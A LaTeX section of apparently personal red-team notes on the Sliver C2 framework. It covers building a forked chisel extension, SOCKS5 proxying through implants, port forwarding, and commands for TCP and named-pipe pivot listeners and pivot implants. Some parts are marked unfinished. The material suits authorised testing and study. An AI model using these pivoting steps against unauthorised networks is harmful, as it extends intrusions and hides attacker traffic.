\section{Port forwarding, Pivots and Socks}

\subsection{Introduction}
\begin{itemize}
    \item Pivot allow you to create "chains" of implant connections to reach back C2
    \item Socks / chisel / port forward allow to proxify traffic from C2  
\end{itemize}

\subsubsection{Chisel pivoting}

chisel has not yet been incorporated as an extension in Sliver. there is an \href{https://github.com/sliverarmory/armory/issues/35}{open issue on Github by MrAle98} that contains a forked version of the tool that can be used. It integrates a few additions, such as listing the currently running tasks of chisel and respectively stopping the tasks.

\begin{verbatim}
sudo apt install mingw-w64
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel
make windowsdll_64
make windowsdll_32
\end{verbatim}



\subsection{SOCKS5 / WireGuard SOCKS5}

In the implant  executing \verb+socks5 start -P <socks_port>+ will be equals to an \verb+ssh -D <socks_port>+ to the target hosting the implant. 

SOCKS proxy feature can only be used on sessions (i.e., interactive sessions) and not beacons.

for WireGuard SOCKS5 see \href{https://sliver.sh/docs?name=Reverse+SOCKS}{Reverse SOCKS} 



\subsection{Port forwarding and Reverse Port forwarding (to finish)}

Sliver provides two mechanisms for port forwarding to tunnel additional connections / tools into the target environment via an implant:
\begin{itemize}
    \item \verb+portfwd+ - This command (available on all C2s) uses Sliver's in-band tunnels to transfer data between your local machine and the implant network (i.e., if you're using HTTP C2 all port forwarded traffic is tunneled over HTTP, same for mTLS/DNS/etc.)
    \item \verb+wg-portfwd+ - This command uses WireGuard port forwarding, and is only available when using WireGuard C2.
\end{itemize}

NOTE: Generally speaking \verb+wg-portfwd+ is faster and more reliable.


\subsection{Pivot (to finish)}

\href{https://sliver.sh/docs?name=Pivots}{Pivots}


Pivots in Sliver are used for specifically pivoting C2 traffic, not to be confused with port forwarding, which is used for tunneling generic tcp connections into a target environment.

Pivots can only be used in "session mode".

Pivots allow you to create "chains" of implant connections, for example if you're trying to deploy a pivot into a highly restricted subnet that cannot route traffic directly to the internet you can instead create an implant that egresses all traffic via another implant in a less restricted subnet.

Pivots can be arbitrarily nested, for example a pivot A can connect thru pivot B to a third egress implant.


In Sliver you use an existing session to create a "pivot listener" and then generate new pivots that can connect back to that listener, just as you would with other C2 protocols/endpoints.

Pivots perform an authenticated peer-to-peer cryptographic key exchange regardless of the underlying pivot protocol, therefore pivots can only communicate with other implants generated by the same server; this restriction cannot be disabled.

\subsubsection{General commands on pivots}

\begin{verbatim}
    pivots details
    pivots graph
    pivots stop
\end{verbatim}


\subsubsection{TCP pivots}

TCP pivots are implemented in pure Go and are supported on all platforms.

\begin{itemize}
    \item in a session start the tcp pivot listener \verb+pivots tcp --bind <listening_ip> --lport <listening_port>+. if \verb+--bind+ is not specified listen on all ?
    \item generate a pivot implant \verb+generate --tcp-pivot <ip>:<port> -N <implant_name> --skip-symbols+ where \verb+ip+ is the ip address where the tcp pivot is running
\end{itemize}



\subsection{Named Pipe Pivots (SMB)}

In Sliver, named pipes are primarily used for pivoting on Windows.



\begin{itemize}
    \item in a session start the pipe pivot listener \verb+pivots named-pipe --bind <pipe_name>+. Note that the default ACL will only allow the current user/group. You can allow all user/groups by using the \verb+--allow-all+ flag.
    \item generate a pivot implant \verb+generate --named-pipe <ip>/pipe/<pipe_name> -N <implant_name> --skip-symbols+ where ip is the ip address where the named pipe pivot is running
\end{itemize}

\verb+sessions+ will display the conection chain.